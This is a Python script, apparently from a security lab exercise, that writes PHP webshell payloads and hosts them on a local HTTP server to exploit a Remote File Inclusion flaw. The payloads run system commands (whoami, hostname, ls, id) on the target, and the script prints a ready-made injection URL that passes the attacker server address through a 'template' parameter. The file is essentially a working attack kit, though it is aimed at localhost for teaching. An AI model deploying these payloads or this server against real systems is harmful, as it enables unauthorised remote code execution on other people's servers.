#!/usr/bin/env python3
"""
Lab 01 Attacker Helper Service
Provides a lightweight HTTP payload server for testing Remote File Inclusion (RFI) offline.
Students/Instructors can run this script to host PHP webshell payloads accessible locally.
"""

import http.server
import socketserver
import os
import sys

PORT = 8000
PAYLOAD_DIR = os.path.join(os.path.dirname(__file__), "attacker_payloads")

def setup_payload_files():
    os.makedirs(PAYLOAD_DIR, exist_ok=True)
    
    # RFI Webshell Payload (saved as rfi_shell.php)
    rfi_payload = """<?php
echo "<div style='background:#b91c1c; color:#fff; padding:15px; border-radius:8px; font-family:sans-serif;'>";
echo "<h3>[!] RFI EXPLOITATION SUCCESSFUL</h3>";
echo "<p>Remote code included from attacker HTTP server!</p>";
echo "<p><strong>Current User:</strong> " . exec('whoami') . "</p>";
echo "<p><strong>Hostname:</strong> " . exec('hostname') . "</p>";
echo "<p><strong>Directory Contents:</strong></p><pre>" . exec('ls -la /srv/labs/lab01') . "</pre>";
echo "</div>";
?>
"""
    with open(os.path.join(PAYLOAD_DIR, "rfi_shell.php"), "w") as f:
        f.write(rfi_payload)

    # RFI test text payload without .php extension for testing query parameters
    rfi_txt = """<?php
echo "<h3>[!] RFI TEST PASSED: Executing PHP code from remote server</h3>";
system('id');
?>
"""
    with open(os.path.join(PAYLOAD_DIR, "rfi_shell"), "w") as f:
        f.write(rfi_txt)

    print(f"[+] Prepared RFI test payloads in {PAYLOAD_DIR}:")
    print(f"    - rfi_shell.php (Standard PHP payload)")
    print(f"    - rfi_shell (No extension payload for ?template=http://127.0.0.1:8000/rfi_shell)")

class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=PAYLOAD_DIR, **kwargs)

def run():
    setup_payload_files()
    with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as httpd:
        print(f"\n[🚀] Attacker Helper HTTP Server running on http://127.0.0.1:{PORT}")
        print(f"    Test RFI URL: http://127.0.0.1:8001/config_loader.php?template=http://127.0.0.1:{PORT}/rfi_shell")
        print(f"    Press Ctrl+C to stop.\n")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[-] Attacker helper server stopped.")

if __name__ == "__main__":
    run()
